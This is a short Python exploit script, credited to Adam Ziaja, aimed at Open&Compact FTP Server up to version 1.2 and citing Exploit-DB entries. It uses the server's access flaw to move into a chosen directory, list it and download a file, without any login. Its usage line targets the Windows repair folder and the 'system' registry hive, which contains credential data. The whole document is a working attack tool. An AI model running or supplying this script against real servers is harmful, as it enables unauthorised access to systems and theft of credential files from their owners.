#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Open&Compact FTP Server <= 1.2 (Gabriel's FTP Server)
# http://www.exploit-db.com/exploits/13932/
# http://www.exploit-db.com/exploits/27401/

# python expl.py 192.168.13.37 'c:\windows\repair\' system

# (C) 2015 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com

import ftplib
import os
import sys
ftp = ftplib.FTP(sys.argv[1])
ftp.set_pasv(False)
if len(sys.argv) > 2:
    print ftp.sendcmd('CWD '+sys.argv[2])
    print ftp.retrlines('LIST')
    if len(sys.argv) > 3:
        print ftp.retrbinary('RETR '+sys.argv[3],open(sys.argv[3],'wb').write)
        #with open(sys.argv[3],'r') as file:
        #    print file.read()
ftp.quit()
